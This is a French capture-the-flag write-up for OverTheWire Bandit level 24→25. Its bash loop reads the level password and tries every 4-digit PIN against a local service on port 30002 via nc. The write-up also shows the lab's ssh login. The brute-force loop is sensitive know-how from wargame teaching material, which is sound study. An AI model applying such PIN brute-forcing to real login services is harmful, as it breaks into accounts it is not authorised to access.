# Bandit Level 24 → 25 — Brute-force PIN

> OverTheWire Bandit · Write-up pédagogique (KRX_404)  
> Site officiel : [Level 24](https://overthewire.org/wargames/bandit/bandit24.html)

## Objectif
Service sur 30002 : password bandit24 + PIN 4 digits (0000-9999).

## Commandes utiles
`bash`, `nc`

## Solution guidée
```bash
pass=$(cat /etc/bandit_pass/bandit24)
for i in $(seq -w 0 9999); do
  echo "$pass $i"
done | nc localhost 30002 | grep -v Wrong
```
Ou version plus douce avec sleep si besoin. Le service finit par renvoyer le password bandit25.


## Ce que tu apprends
Petit brute-force contrôlé + automatisation bash.

## Note importante
Les **mots de passe Bandit changent** quand OverTheWire reset le lab.  
N’copie pas un password trouvé sur Internet : **relance les commandes** pour obtenir le tien.

## Connexion type
```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```
